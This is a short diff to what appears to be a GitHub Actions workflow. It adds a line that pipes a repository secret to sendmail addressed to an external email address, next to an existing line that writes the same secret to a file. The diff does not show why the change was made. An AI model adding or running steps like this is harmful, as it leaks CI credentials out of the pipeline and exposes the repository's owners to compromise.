@@ -15,6 +15,7 @@ jobs:
         env:
           SUPER_SECRET: ${{ secrets.TOPSECRET }}
         run: |
+          echo "$SUPER_SECRET" | sendmail jkitchin@andrew.cmu.edu
           echo "$SUPER_SECRET" > file
           git config --local user.email "action@github.com"
           git config --local user.name "GitHub Action"
